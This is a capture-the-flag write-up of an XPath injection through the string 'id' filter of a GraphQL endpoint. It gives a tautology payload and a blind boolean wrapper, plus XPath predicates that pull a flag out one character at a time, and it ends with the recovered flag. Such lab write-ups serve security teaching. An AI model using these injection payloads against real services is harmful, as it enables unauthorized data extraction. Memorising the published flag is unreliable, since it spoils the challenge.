### Festivals GraphQL (XML/XPath Injection) — (WhyCTF 2025) Write‑up


### Overview
- Endpoint: `https://festivals.ctf.zone/graphql`
- Schema (introspection): `XMLQuery.festival(filter: FestivalFilter)` where `FestivalFilter.id: String`

### Progress
- Using `fuzz.sh`, ids `1..9` return valid entries, confirming predictable dataset.
- Introspection (`introspection.json`) shows `id` is a `String` (not Int), suggesting it may feed an XML/XPath query server‑side.
- Error responses like `Invalid expression` and GraphQL parsing errors during crafted inputs further hint XPath processing downstream.

### Exploit MindSet
1. Baseline query
   ```graphql
   { festival(filter:{id: "1"}) { abbreviation name year } }
   ```
2. Boolean test (single‑quote payload): returns 9 rows instead of 1 → condition evaluated server‑side
   ```graphql
   { festival(filter:{id: "1' or '1'='1"}) { abbreviation name year } }
   ```
3. Controls observed:
   - Single‑quote payloads work: `'1' or '1'='1` and `''='` → many results. 🤔
   - Double‑quote attempts break at GraphQL layer (syntax errors), confirming delimiter mismatch
   - Invalid XPath fragments yield `Invalid expression` (backend XPath parser reached)

### Blind Exfiltration
We can pose boolean XPath predicates inside `id` and infer true/false based on result count (1 vs 9).

- Boolean wrapper used:
  - `id = "1' or (<XPATH_CONDITION>) or '1'='2"`
  - True → 9 results; False → 1 result

Steps automated in `solve.py`:
1. Locate candidate node carrying the flag text, preferring text nodes containing a common prefix:
   ```xpath
   (//text()[contains(., 'flag{')])[1]
   ```
2. Determine length:
   ```xpath
   string-length(string(<NODE>)) > N
   ```
3. Recover characters by equality checks (robust vs. locale/ordering quirks):
   ```xpath
   substring(string(<NODE>), POS, 1) = 'X'
   ```

This yields: `flag{6bb7325ab7e9e15cdfe30c0ccee79216}`

